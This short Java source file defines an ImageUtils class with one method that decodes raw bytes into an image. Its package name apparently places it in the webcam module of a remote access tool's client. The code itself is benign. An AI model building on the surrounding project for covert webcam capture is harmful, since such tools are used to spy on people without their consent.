package pro.jrat.client.webcam;

import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.IOException;

import javax.imageio.ImageIO;

public class ImageUtils {
	
	public static BufferedImage decodeImage(byte[] data) throws IOException {
		return ImageIO.read(new ByteArrayInputStream(data));
	}

}
